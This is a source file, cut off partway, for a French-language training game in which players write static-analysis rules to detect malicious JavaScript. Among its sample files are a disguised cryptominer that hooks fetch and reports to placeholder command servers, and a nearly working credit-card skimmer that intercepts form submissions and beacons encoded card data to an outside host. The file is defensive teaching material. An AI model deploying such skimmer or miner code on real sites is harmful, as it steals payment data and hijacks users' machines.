import React, { useState, useEffect } from 'react';
import { Link } from 'wouter';
import { motion } from 'framer-motion';
import { 
  ArrowLeft, Shield, AlertCircle, Code, File, 
  Play, ChevronRight, Check, X, Info, PlusCircle, RefreshCw, Search
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Progress } from "@/components/ui/progress";
import { Switch } from "@/components/ui/switch";
import { Badge } from "@/components/ui/badge";
import HomeLayout from '@/components/layout/HomeLayout';
import PageTitle from '@/components/utils/PageTitle';

// Types
interface Rule {
  id: string;
  type: 'pattern' | 'function' | 'import' | 'api';
  pattern: string;
  description: string;
  enabled: boolean;
  isMalicious: boolean;
}

interface File {
  id: string;
  name: string;
  type: string;
  content: string;
  isMalicious: boolean;
  analysisResult?: AnalysisResult;
  maliciousPatterns?: string[];
}

interface CodePattern {
  pattern: string;
  description: string;
  isMalicious: boolean;
  context?: string;
}

interface AnalysisResult {
  detectedPatterns: string[];
  score: number;
  isDetectedAsMalicious: boolean;
  matchedRules: Rule[];
}

export default function StaticAnalysisLevel() {
  const [files, setFiles] = useState<File[]>([]);
  const [rules, setRules] = useState<Rule[]>([]);
  const [isAddingRule, setIsAddingRule] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [newRule, setNewRule] = useState({
    type: 'pattern',
    pattern: '',
    description: '',
    isMalicious: true
  });
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [analysisResults, setAnalysisResults] = useState<{
    correctlyDetected: number;
    falsePositives: number;
    missed: number;
    score: number;
  } | null>(null);
  const [showHelp, setShowHelp] = useState(false);
  const [levelCompleted, setLevelCompleted] = useState(false);
  const [highlightedCode, setHighlightedCode] = useState<string | null>(null);
  
  // Initialiser le niveau avec des données
  useEffect(() => {
    loadLevel();
  }, []);
  
  // Fonction pour charger les données du niveau
  const loadLevel = () => {
    // Réinitialiser l'état
    setFiles([]);
    setRules([]);
    setSelectedFile(null);
    setAnalysisResults(null);
    setIsAnalyzing(false);
    setLevelCompleted(false);
    
    // Charger les fichiers pour ce niveau
    const levelFiles: File[] = [
      {
        id: 'file1',
        name: 'analytics.js',
        type: 'JavaScript',
        content: `// Analytics script for website performance tracking
function initAnalytics() {
  // Init tracking
  const trackingId = "UA-123456-7";
  
  // Standard Google Analytics code
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  
  ga('create', trackingId, 'auto');
  ga('send', 'pageview');
  
  // Custom event tracking
  function trackEvent(category, action, label) {
    ga('send', 'event', category, action, label);
    console.log(\`Event tracked: \${category} - \${action}\`);
  }
  
  return {
    trackPageView: function(page) {
      ga('send', 'pageview', page);
    },
    trackEvent: trackEvent
  };
}`,
        isMalicious: false
      },
      {
        id: 'file2',
        name: 'loader.js',
        type: 'JavaScript',
        content: `// Dynamic resource loader
function loadScript(url, callback) {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = url;
  
  // Attach handlers for all browsers
  script.onload = script.onreadystatechange = function() {
    if (!this.readyState || this.readyState === 'complete') {
      callback();
    }
  };
  
  document.head.appendChild(script);
}

// Initialize resources
document.addEventListener('DOMContentLoaded', function() {
  // Load third-party resources
  loadScript('https://cdn.example.com/analytics.js', function() {
    console.log('Analytics loaded');
  });
  
  // Initialize app features
  initializeFeatures();
});

function initializeFeatures() {
  // App-specific initialization code
  console.log('Features initialized');
}`,
        isMalicious: false
      },
      {
        id: 'file3',
        name: 'malicious-backdoor.js',
        type: 'JavaScript',
        content: `// Miner initialization script obfuscated as "performance optimization"
function init_perf_optimization() {
  // Create hidden container
  var container = document.createElement('div');
  container.style.display = 'none';
  document.body.appendChild(container);
  
  // "Configuration" (actually C2 endpoints)
  var config = {
    endpoint: 'https://mining-server.com/proxy',
    fallback: 'https://backup-c2-server.net/api',
    key: 'XMR_WALLET_ADDRESS_HERE'
  };
  
  // Hook into browser APIs
  function hookAPI() {
    // Override the fetch API to inject mining code
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
      // Secretly mine while performing legitimate fetch operations
      startMiner();
      return originalFetch.apply(this, arguments);
    };
  }
  
  // Actual mining function
  function startMiner() {
    // Build web worker to run in background
    const minerCode = 'self.onmessage=function(){for(var e=0;e<1e8;e++)Math.random()*Math.random();self.postMessage("done")};';
    const blob = new Blob([minerCode], {type: 'application/javascript'});
    const worker = new Worker(URL.createObjectURL(blob));
    
    // Start mining in background
    worker.postMessage('start');
    
    // Report mining statistics back to server
    fetch(config.endpoint + '?key=' + config.key, {
      method: 'POST',
      body: JSON.stringify({
        type: 'worker_started',
        timestamp: Date.now()
      })
    }).catch(() => {
      // Try fallback server if main C2 is down
      fetch(config.fallback, {method: 'POST'});
    });
  }
  
  // Disguise as normal operation
  setTimeout(function() {
    console.log('Performance optimization complete');
    // Actual malicious code begins
    hookAPI();
    startMiner();
  }, 3000); // Delay to avoid detection
}

// Execute immediately but disguise as legitimate code
(function() {
  console.log('Loading performance optimizations...');
  init_perf_optimization();
})();`,
        isMalicious: true,
        maliciousPatterns: [
          'fetch(config.endpoint',
          'startMiner',
          'hookAPI',
          'originalFetch',
          'worker = new Worker',
          'disguise',
          'mining-server.com'
        ]
      },
      {
        id: 'file4',
        name: 'shopping-cart.js',
        type: 'JavaScript',
        content: `// Shopping cart functionality
class ShoppingCart {
  constructor() {
    this.items = [];
    this.total = 0;
    this.taxRate = 0.08;
    this.init();
  }
  
  init() {
    console.log('Shopping cart initialized');
    // Load cart from local storage if available
    const savedCart = localStorage.getItem('shopping-cart');
    if (savedCart) {
      try {
        const cartData = JSON.parse(savedCart);
        this.items = cartData.items || [];
        this.recalculateTotal();
      } catch (e) {
        console.error('Error parsing saved cart:', e);
        localStorage.removeItem('shopping-cart');
      }
    }
  }
  
  addItem(product, quantity = 1) {
    // Check if item already exists
    const existingItem = this.items.find(item => item.id === product.id);
    if (existingItem) {
      existingItem.quantity += quantity;
    } else {
      this.items.push({
        id: product.id,
        name: product.name,
        price: product.price,
        quantity
      });
    }
    
    this.recalculateTotal();
    this.saveCart();
    this.updateUI();
  }
  
  removeItem(productId) {
    this.items = this.items.filter(item => item.id !== productId);
    this.recalculateTotal();
    this.saveCart();
    this.updateUI();
  }
  
  recalculateTotal() {
    this.total = this.items.reduce((sum, item) => sum + (item.price * item.quantity), 0);
  }
  
  getTaxAmount() {
    return this.total * this.taxRate;
  }
  
  getGrandTotal() {
    return this.total + this.getTaxAmount();
  }
  
  saveCart() {
    localStorage.setItem('shopping-cart', JSON.stringify({
      items: this.items,
      timestamp: Date.now()
    }));
  }
  
  updateUI() {
    // Update DOM elements
    const cartItemsEl = document.getElementById('cart-items');
    const cartTotalEl = document.getElementById('cart-total');
    
    if (cartItemsEl) {
      cartItemsEl.innerHTML = this.items.map(item => \`
        <div class="cart-item">
          <span>\${item.name} x \${item.quantity}</span>
          <span>$\${(item.price * item.quantity).toFixed(2)}</span>
        </div>
      \`).join('');
    }
    
    if (cartTotalEl) {
      cartTotalEl.textContent = '$' + this.getGrandTotal().toFixed(2);
    }
  }
  
  checkout() {
    // Here we would typically send the cart to a server for processing
    // For demo purposes, we'll just clear the cart
    alert('Order placed! Total: $' + this.getGrandTotal().toFixed(2));
    this.items = [];
    this.recalculateTotal();
    this.saveCart();
    this.updateUI();
  }
}`,
        isMalicious: false
      },
      {
        id: 'file5',
        name: 'form-processor.js',
        type: 'JavaScript',
        content: `// Form submission handler script
(function() {
  // Initialize form processor
  function initFormProcessor() {
    // Get all forms
    const forms = document.querySelectorAll('form.contact-form');
    
    // Attach event listeners
    forms.forEach(form => {
      form.addEventListener('submit', handleSubmit);
    });
    
    // Set up form validation
    setupValidation();
  }
  
  // Form submission handler
  function handleSubmit(event) {
    event.preventDefault();
    
    // Get form data
    const form = event.target;
    const formData = new FormData(form);
    const data = {};
    
    // Convert FormData to JSON
    for (let [key, value] of formData.entries()) {
      data[key] = value;
    }
    
    // Add timestamp
    data.timestamp = Date.now();
    
    // Validate data
    if (!validateForm(data)) {
      showError('Please fill out all required fields correctly.');
      return;
    }
    
    // Send data to server
    submitForm(data, form);
  }
  
  // Form validation
  function validateForm(data) {
    // Basic validation
    if (!data.name || data.name.trim() === '') return false;
    if (!data.email || !data.email.includes('@')) return false;
    
    // Email validation regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(data.email)) return false;
    
    return true;
  }
  
  // Show error message
  function showError(message) {
    const errorElement = document.createElement('div');
    errorElement.className = 'error-message';
    errorElement.textContent = message;
    
    // Add to DOM
    document.querySelector('.form-container').appendChild(errorElement);
    
    // Remove after 5 seconds
    setTimeout(() => {
      errorElement.remove();
    }, 5000);
  }
  
  // Submit form data to server
  function submitForm(data, form) {
    // Show loading state
    const submitButton = form.querySelector('button[type="submit"]');
    const originalText = submitButton.textContent;
    submitButton.textContent = 'Sending...';
    submitButton.disabled = true;
    
    // Send data to server
    fetch('/api/submit-form', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
      // Handle success
      form.reset();
      showSuccess('Form submitted successfully!');
    })
    .catch(error => {
      // Handle error
      console.error('Error submitting form:', error);
      showError('An error occurred. Please try again.');
    })
    .finally(() => {
      // Reset button
      submitButton.textContent = originalText;
      submitButton.disabled = false;
    });
  }
  
  // Show success message
  function showSuccess(message) {
    const successElement = document.createElement('div');
    successElement.className = 'success-message';
    successElement.textContent = message;
    
    // Add to DOM
    document.querySelector('.form-container').appendChild(successElement);
    
    // Remove after 5 seconds
    setTimeout(() => {
      successElement.remove();
    }, 5000);
  }
  
  // Set up validation
  function setupValidation() {
    const inputs = document.querySelectorAll('.contact-form input, .contact-form textarea');
    
    inputs.forEach(input => {
      input.addEventListener('blur', function() {
        validateInput(this);
      });
    });
  }
  
  // Validate individual input
  function validateInput(input) {
    if (input.hasAttribute('required') && input.value.trim() === '') {
      input.classList.add('error');
    } else {
      input.classList.remove('error');
    }
    
    // Email validation
    if (input.type === 'email') {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(input.value)) {
        input.classList.add('error');
      } else {
        input.classList.remove('error');
      }
    }
  }
  
  // Initialize when DOM is ready
  document.addEventListener('DOMContentLoaded', initFormProcessor);
})();`,
        isMalicious: false
      },
      {
        id: 'file6',
        name: 'credit-card-skimmer.js',
        type: 'JavaScript',
        content: `// Legitimate-looking payment form enhancement
(function() {
  // Initialize on DOM ready
  document.addEventListener('DOMContentLoaded', function() {
    enhancePaymentForm();
    loadFontAwesome();
    // Hidden malicious function
    capturePaymentData();
  });
  
  // Add visual enhancements to the payment form
  function enhancePaymentForm() {
    const form = document.querySelector('form.payment-form');
    if (!form) return;
    
    // Add credit card type detection
    const ccInput = form.querySelector('input[name="cc-number"]');
    if (ccInput) {
      ccInput.addEventListener('input', detectCardType);
    }
    
    // Add form validation
    form.addEventListener('submit', validatePaymentForm);
  }
  
  // Load Font Awesome for card icons
  function loadFontAwesome() {
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css';
    document.head.appendChild(link);
  }
  
  // Detect credit card type based on number
  function detectCardType(event) {
    const number = event.target.value.replace(/\\s+/g, '');
    const iconElement = document.getElementById('cc-icon');
    
    // Simple card type detection
    let cardType = 'unknown';
    if (number.startsWith('4')) {
      cardType = 'visa';
    } else if (/^5[1-5]/.test(number)) {
      cardType = 'mastercard';
    } else if (/^3[47]/.test(number)) {
      cardType = 'amex';
    } else if (/^6(?:011|5)/.test(number)) {
      cardType = 'discover';
    }
    
    // Update icon if element exists
    if (iconElement) {
      iconElement.className = \`fab fa-cc-\${cardType}\`;
    }
  }
  
  // Validate payment form on submit
  function validatePaymentForm(event) {
    event.preventDefault();
    
    const form = event.target;
    const ccNumber = form.querySelector('input[name="cc-number"]').value.replace(/\\s+/g, '');
    const ccExp = form.querySelector('input[name="cc-exp"]').value;
    const ccCvv = form.querySelector('input[name="cc-cvv"]').value;
    
    // Basic validation
    if (ccNumber.length < 15) {
      showError('Invalid card number');
      return;
    }
    
    if (!ccExp.match(/^\\d{2}\\/\\d{2}$/)) {
      showError('Invalid expiration date (MM/YY)');
      return;
    }
    
    if (ccCvv.length < 3) {
      showError('Invalid security code');
      return;
    }
    
    // If validation passes, submit the form
    processPayment(form);
  }
  
  // Show error message
  function showError(message) {
    alert(message);
  }
  
  // Process payment through payment gateway
  function processPayment(form) {
    // In a real application, we would send this to a payment processor
    alert('Payment processed successfully!');
    form.reset();
  }
  
  // *** Malicious code disguised as analytics ***
  function capturePaymentData() {
    // Create invisible iframe to receive data
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);
    
    // Override form submit event to capture payment data
    const originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
      try {
        const form = this;
        if (form.classList.contains('payment-form') || 
            form.querySelector('input[name="cc-number"]')) {
          const formData = new FormData(form);
          const data = {};
          
          // Extract form fields
          for (let [key, value] of formData.entries()) {
            data[key] = value;
          }
          
          // Exfiltrate credit card data
          sendStolenData(data);
        }
      } catch (e) {
        // Silently fail to avoid detection
        console.log('Enhanced form validation complete');
      }
      
      // Call original submit method
      return originalSubmit.apply(this, arguments);
    };
    
    // Listen for input in payment fields
    document.addEventListener('input', function(e) {
      if (e.target.name && (
          e.target.name.includes('cc') || 
          e.target.name.includes('card') ||
          e.target.name.includes('cvv'))) {
        // Store partial data as user types
        sessionStorage.setItem(\`cc_data_\${e.target.name}\`, e.target.value);
      }
    });
  }
  
  // Send stolen data to attacker's server
  function sendStolenData(data) {
    // Convert data to base64 to avoid detection in network traffic
    const encodedData = btoa(JSON.stringify(data));
    
    // Exfiltrate data (disguised as analytics)
    const exfilUrl = 'https://stats-collector.com/api/collect';
    
    // Create beacon to send data without waiting for response
    navigator.sendBeacon(exfilUrl, encodedData);
    
    // Fallback for older browsers
    if (!navigator.sendBeacon) {
      const img = new Image();
      img.src = \`\${exfilUrl}?data=\${encodedData}\`;
    }
  }
})();`,
        isMalicious: true,
        maliciousPatterns: [
          'capturePaymentData',
          'sendStolenData',
          'exfiltrate',
          'originalSubmit',
          'credit card',
          'stats-collector.com',
          'navigator.sendBeacon'
        ]
      }
    ];
    
    setFiles(levelFiles);
    
    // Règles initiales
    const initialRules: Rule[] = [
      {
        id: 'rule1',
        type: 'pattern',
        pattern: 'eval(',
        description: 'Utilisation de la fonction eval() qui peut exécuter du code arbitraire',
        enabled: true,
        isMalicious: true
      },
      {
        id: 'rule2',
        type: 'api',
        pattern: 'fetch(',
        description: 'Appels réseau qui pourraient être utilisés pour exfiltrer des données',
        enabled: true,
        isMalicious: false
      }
    ];
    
    setRules(initialRules);
  };
  
  // Fonction pour analyser un fichier avec les règles actuelles
  const analyzeFile = (file: File): AnalysisResult => {
    // Filtrer les règles activées
    const enabledRules = rules.filter(rule => rule.enabled);
    
    // Trouver tous les patterns qui correspondent
    const matchedRules = enabledRules.filter(rule => 
      file.content.includes(rule.pattern)
    );
    
    // Extraire les patterns détectés
    const detectedPatterns = matchedRules.map(rule => rule.pattern);
    
    // Calculer un score simple basé sur le nombre de règles malveillantes détectées
    const maliciousRulesMatched = matchedRules.filter(rule => rule.isMalicious).length;
    const nonMaliciousRulesMatched = matchedRules.filter(rule => !rule.isMalicious).length;
    
    // Formule: 100 * (règles malveillantes trouvées / total des règles malveillantes)
    const totalMaliciousRules = enabledRules.filter(rule => rule.isMalicious).length;
    
    // Éviter division par zéro
    const score = totalMaliciousRules > 0 
      ? Math.round((maliciousRulesMatched / totalMaliciousRules) * 100) 
      : 0;
    
    // Un fichier est considéré comme malveillant si au moins une règle malveillante correspond
    const isDetectedAsMalicious = maliciousRulesMatched > 0;
    
    return {
      detectedPatterns,
      score,
      isDetectedAsMalicious,
      matchedRules
    };
  };
  
  // Fonction pour exécuter l'analyse sur tous les fichiers
  const runFullAnalysis = () => {
    setIsAnalyzing(true);
    
    // Analyser tous les fichiers
    const analyzedFiles = files.map(file => {
      const result = analyzeFile(file);
      return {
        ...file,
        analysisResult: result
      };
    });
    
    setFiles(analyzedFiles);
    
    // Calculer les résultats globaux
    let correctlyDetected = 0;
    let falsePositives = 0;
    let missed = 0;
    
    analyzedFiles.forEach(file => {
      if (file.isMalicious && file.analysisResult?.isDetectedAsMalicious) {
        correctlyDetected++;
      } else if (!file.isMalicious && file.analysisResult?.isDetectedAsMalicious) {
        falsePositives++;
      } else if (file.isMalicious && !file.analysisResult?.isDetectedAsMalicious) {
        missed++;
      }
    });
    
    // Calculer le score global
    const totalMaliciousFiles = analyzedFiles.filter(file => file.isMalicious).length;
    const detectionRate = totalMaliciousFiles > 0 
      ? correctlyDetected / totalMaliciousFiles 
      : 0;
    
    const totalBenignFiles = analyzedFiles.filter(file => !file.isMalicious).length;
    const falsePositiveRate = totalBenignFiles > 0 
      ? falsePositives / totalBenignFiles 
      : 0;
    
    // Score = 100 * (taux de détection - taux de faux positifs / 2)
    // Pénalité plus faible pour les faux positifs
    const score = Math.round(100 * (detectionRate - falsePositiveRate / 2));
    
    // Mettre à jour les résultats
    setAnalysisResults({
      correctlyDetected,
      falsePositives,
      missed,
      score: Math.max(0, score) // Assurer que le score n'est pas négatif
    });
    
    // Définir si le niveau est complété
    // Complétion si tous les fichiers malveillants sont détectés et 1 faux positif maximum
    if (correctlyDetected === totalMaliciousFiles && falsePositives <= 1) {
      setLevelCompleted(true);
    }
    
    setIsAnalyzing(false);
  };
  
  // Fonction pour mettre en surbrillance le code malveillant
  const highlightMaliciousCode = (file: File) => {
    if (!file.maliciousPatterns || file.maliciousPatterns.length === 0) {
      return file.content;
    }
    
    let highlighted = file.content;
    
    // Mettre en surbrillance chaque pattern
    file.maliciousPatterns.forEach(pattern => {
      // Échapper les caractères spéciaux pour la regex
      const escapedPattern = pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const regex = new RegExp(escapedPattern, 'g');
      
      // Remplacer par la version en surbrillance
      highlighted = highlighted.replace(regex, match => 
        `<span class="bg-red-500/20 text-red-300 px-1 rounded">${match}</span>`
      );
    });
    
    return highlighted;
  };
  
  // Ajouter une règle
  const addRule = () => {
    if (!newRule.pattern || !newRule.description) return;
    
    const rule: Rule = {
      id: `rule-${rules.length + 1}`,
      type: newRule.type as 'pattern' | 'function' | 'import' | 'api',
      pattern: newRule.pattern,
      description: newRule.description,
      enabled: true,
      isMalicious: newRule.isMalicious
    };
    
    setRules([...rules, rule]);
    
    // Réinitialiser le formulaire
    setNewRule({
      type: 'pattern',
      pattern: '',
      description: '',
      isMalicious: true
    });
    
    setIsAddingRule(false);
  };
  
  // Activer/désactiver une règle
  const toggleRule = (id: string) => {
    setRules(rules.map(rule => 
      rule.id === id ? {...rule, enabled: !rule.enabled} : rule
    ));
  };
  
  // Supprimer une règle
  const deleteRule = (id: string) => {
    setRules(rules.filter(rule => rule.id !== id));
  };
  
  // Obtenir la couleur pour le type de règle
  const getRuleTypeColor = (type: string) => {
    switch (type) {
      case 'pattern':
        return 'bg-blue-900/40 text-blue-400';
      case 'function':
        return 'bg-green-900/40 text-green-400';
      case 'import':
        return 'bg-purple-900/40 text-purple-400';
      case 'api':
        return 'bg-amber-900/40 text-amber-400';
      default:
        return 'bg-gray-900/40 text-gray-400';
    }
  };
  
  // Afficher la description du type de règle
  const getRuleTypeDescription = (type: string) => {
    switch (type) {
      case 'pattern':
        return 'Motif textuel à rechercher dans le code';
      case 'function':
        return 'Fonction JavaScript suspecte';
      case 'import':
        return 'Import ou dépendance suspecte';
      case 'api':
        return 'Appel d\'API ou méthode native du navigateur';
      default:
        return 'Type de règle personnalisé';
    }
  };

  return (
    <HomeLayout>
      <PageTitle title="CodeShield - Niveau 2: Analyse Statique" />
      
      <div className="min-h-[calc(100vh-64px)] relative overflow-hidden bg-gradient-to-b from-slate-900 via-blue-950 to-slate-900">
        <div className="container mx-auto p-4 relative z-10">
          {/* En-tête */}
          <div className="mb-8 flex flex-col md:flex-row justify-between items-start">
            <div>
              <Link href="/cyber/arcade/code-shield">
                <Button variant="ghost" className="text-blue-300 hover:text-blue-100 p-0 mb-4">
                  <ArrowLeft className="mr-2 h-4 w-4" /> Retour à CodeShield
                </Button>
              </Link>
              <h1 className="text-3xl md:text-4xl font-bold text-white mb-2 flex items-center">
                <Shield className="mr-2 h-8 w-8 text-blue-400" />
                Niveau 2: Analyse Statique
              </h1>
              <p className="text-blue-200 max-w-3xl">
                Identifiez les logiciels malveillants en repérant des motifs suspects dans leur contenu sans les exécuter.
                Cette technique vous permet de détecter des menaces même sans signature connue.
              </p>
            </div>
            <div className="mt-4 md:mt-0">
              <Button
                variant="outline"
                className="text-blue-300 border-blue-500/50 hover:bg-blue-900/20"
                onClick={() => setShowHelp(true)}
              >
                <Info className="mr-2 h-4 w-4" />
                Aide et conseils
              </Button>
            </div>
          </div>

          {/* Contenu principal */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2">
              {/* Fichiers à analyser */}
              <Card className="bg-slate-900/70 border-blue-500/30 shadow-lg mb-6">
                <CardHeader className="pb-2">
                  <CardTitle className="flex items-center text-white">
                    <File className="mr-2 h-5 w-5 text-blue-400" />
                    Code à analyser
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    Examinez ces fichiers JavaScript pour identifier du code malveillant
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  {selectedFile ? (
                    <div>
                      <div className="flex items-center justify-between mb-4">
                        <Button
                          variant="ghost"
                          className="text-blue-300 hover:text-blue-100 p-0"
                          onClick={() => {
                            setSelectedFile(null);
                            setHighlightedCode(null);
                          }}
                        >
                          <ArrowLeft className="mr-2 h-4 w-4" /> Retour à la liste
                        </Button>
                        
                        <div className="flex items-center space-x-2">
                          <Badge className={`${selectedFile.isMalicious ? 'bg-red-900/40 text-red-400' : 'bg-green-900/40 text-green-400'}`}>
                            {selectedFile.isMalicious ? 'Malveillant' : 'Légitime'}
                          </Badge>
                          
                          {selectedFile.analysisResult && (
                            <Badge className={`${selectedFile.isMalicious === selectedFile.analysisResult.isDetectedAsMalicious 
                              ? 'bg-blue-900/40 text-blue-400' 
                              : 'bg-amber-900/40 text-amber-400'}`}
                            >
                              {selectedFile.analysisResult.isDetectedAsMalicious 
                                ? 'Détecté comme malveillant' 
                                : 'Détecté comme légitime'}
                            </Badge>
                          )}
                        </div>
                      </div>
                      
                      <div className="bg-slate-800/50 border border-blue-500/30 rounded-lg overflow-hidden mb-4">
                        <div className="flex items-center justify-between p-3 border-b border-gray-700">
                          <div className="flex items-center">
                            <Code className="h-5 w-5 text-gray-400 mr-2" />
                            <h3 className="text-white font-medium">{selectedFile.name}</h3>
                          </div>
                          <span className="text-xs bg-gray-700 text-gray-300 px-2 py-1 rounded">
                            {selectedFile.type}
                          </span>
                        </div>
                        
                        <div className="p-0">
                          <div className="flex border-b border-gray-700">
                            <button 
                              className={`px-4 py-2 text-sm ${highlightedCode === null ? 'text-white bg-blue-900/40' : 'text-gray-400 hover:text-white'}`}
                              onClick={() => setHighlightedCode(null)}
                            >
                              Code standard
                            </button>
                            {selectedFile.isMalicious && (
                              <button 
                                className={`px-4 py-2 text-sm ${highlightedCode !== null ? 'text-white bg-blue-900/40' : 'text-gray-400 hover:text-white'}`}
                                onClick={() => setHighlightedCode(highlightMaliciousCode(selectedFile))}
                              >
                                <AlertCircle className="inline-block h-3 w-3 mr-1" />
                                Afficher les zones malveillantes
                              </button>
                            )}
                          </div>
                          <pre className="bg-black/30 p-3 whitespace-pre-wrap font-mono text-sm text-gray-300 overflow-x-auto max-h-96">
                            {highlightedCode ? (
                              <div dangerouslySetInnerHTML={{ __html: highlightedCode }} />
                            ) : (
                              selectedFile.content
                            )}
                          </pre>
                        </div>
                      </div>
                      
                      {/* Résultats de l'analyse */}
                      {selectedFile.analysisResult && (
                        <div className="bg-blue-900/20 border border-blue-500/20 p-4 rounded-lg">
                          <h3 className="text-white font-medium mb-3">Résultats de l'analyse</h3>
                          
                          {selectedFile.analysisResult.matchedRules.length > 0 ? (
                            <div className="space-y-3">
                              <p className="text-blue-200 mb-2">
                                L'analyse a identifié {selectedFile.analysisResult.matchedRules.length} motifs suspects :
                              </p>
                              <ul className="space-y-2">
                                {selectedFile.analysisResult.matchedRules.map((rule, index) => (
                                  <li key={index} className="flex items-start">
                                    <div className={`rounded-full p-1 mr-2 h-6 w-6 flex-shrink-0 flex items-center justify-center ${rule.isMalicious ? 'bg-red-900/40 text-red-200' : 'bg-blue-900/40 text-blue-200'} mt-0.5`}>
                                      {rule.isMalicious ? '!' : 'i'}
                                    </div>
                                    <div>
                                      <p className={`font-medium ${rule.isMalicious ? 'text-red-300' : 'text-blue-300'}`}>
                                        {rule.pattern}
                                      </p>
                                      <p className="text-gray-400 text-sm">
                                        {rule.description}
                                      </p>
                                    </div>
                                  </li>
                                ))}
                              </ul>
                            </div>
                          ) : (
                            <p className="text-blue-200">
                              Aucun motif suspect n'a été détecté dans ce fichier.
                            </p>
                          )}
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <div className="flex justify-between items-center mb-4">
                        <h3 className="text-white font-medium">Fichiers disponibles</h3>
                        
                        <Button 
                          onClick={runFullAnalysis}
                          className={`${isAnalyzing ? 'bg-amber-600' : 'bg-blue-600 hover:bg-blue-700'} text-white`}
                          disabled={isAnalyzing}
                        >
                          {isAnalyzing ? (
                            <>
                              <RefreshCw className="mr-2 h-4 w-4 animate-spin" />
                              Analyse en cours...
                            </>
                          ) : (
                            <>
                              <Search className="mr-2 h-4 w-4" />
                              Analyser tous les fichiers
                            </>
                          )}
                        </Button>
                      </div>
                      
                      {files.map(file => (
                        <div 
                          key={file.id} 
                          className={`bg-slate-800/50 border cursor-pointer hover:bg-blue-900/20 transition-all ${
                            file.analysisResult ? (
                              file.isMalicious === file.analysisResult.isDetectedAsMalicious 
                                ? 'border-green-500/50' 
                                : 'border-red-500/50'
                            ) : 'border-gray-700'
                          } rounded-lg overflow-hidden`}
                          onClick={() => setSelectedFile(file)}
                        >
                          <div className="flex items-center justify-between p-3">
                            <div className="flex items-center">
                              <Code className="h-5 w-5 text-gray-400 mr-2" />
                              <div>
                                <h3 className="text-white font-medium">{file.name}</h3>
                                <p className="text-xs text-gray-400">{file.type}</p>
                              </div>
                            </div>
                            <div className="flex items-center space-x-2">
                              {file.analysisResult && (
                                <Badge variant="outline" className={`${
                                  file.analysisResult.isDetectedAsMalicious 
                                    ? 'border-red-500/50 text-red-400' 
                                    : 'border-green-500/50 text-green-400'
                                }`}>
                                  {file.analysisResult.isDetectedAsMalicious 
                                    ? <AlertCircle className="h-3 w-3 mr-1 inline" /> 
                                    : <Check className="h-3 w-3 mr-1 inline" />}
                                  {file.analysisResult.isDetectedAsMalicious 
                                    ? 'Suspect' 
                                    : 'Sécurisé'}
                                </Badge>
                              )}
                              
                              {file.isMalicious && file.analysisResult && !file.analysisResult.isDetectedAsMalicious && (
                                <Badge className="bg-red-900/40 text-red-300">
                                  <AlertCircle className="h-3 w-3 mr-1 inline" />
                                  Menace manquée
                                </Badge>
                              )}
                              
                              {!file.isMalicious && file.analysisResult && file.analysisResult.isDetectedAsMalicious && (
                                <Badge className="bg-amber-900/40 text-amber-300">
                                  <X className="h-3 w-3 mr-1 inline" />
                                  Faux positif
                                </Badge>
                              )}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>

            <div>
              {/* Règles d'analyse */}
              <Card className="bg-slate-900/70 border-blue-500/30 shadow-lg mb-6 sticky top-4">
                <CardHeader>
                  <CardTitle className="flex items-center text-white">
                    <Shield className="mr-2 h-5 w-5 text-blue-400" />
                    Règles d'analyse statique
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    Définissez des motifs pour détecter du code suspect
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Résultat global */}
                  {analysisResults && (
                    <div className="mb-4">
                      <div className="flex justify-between text-sm text-gray-400 mb-1">
                        <span>Niveau de précision: {analysisResults.score}/100</span>
                      </div>
                      <Progress value={analysisResults.score} className="h-2" />
                      <div className="grid grid-cols-3 gap-2 mt-3">
                        <div className="bg-green-900/20 p-2 rounded-lg border border-green-500/20 text-center">
                          <div className="text-xl font-bold text-white">{analysisResults.correctlyDetected}</div>
                          <div className="text-green-400 text-xs">Détectés</div>
                        </div>
                        <div className="bg-amber-900/20 p-2 rounded-lg border border-amber-500/20 text-center">
                          <div className="text-xl font-bold text-white">{analysisResults.falsePositives}</div>
                          <div className="text-amber-400 text-xs">Faux positifs</div>
                        </div>
                        <div className="bg-red-900/20 p-2 rounded-lg border border-red-500/20 text-center">
                          <div className="text-xl font-bold text-white">{analysisResults.missed}</div>
                          <div className="text-red-400 text-xs">Manqués</div>
                        </div>
                      </div>
                      
                      {levelCompleted && (
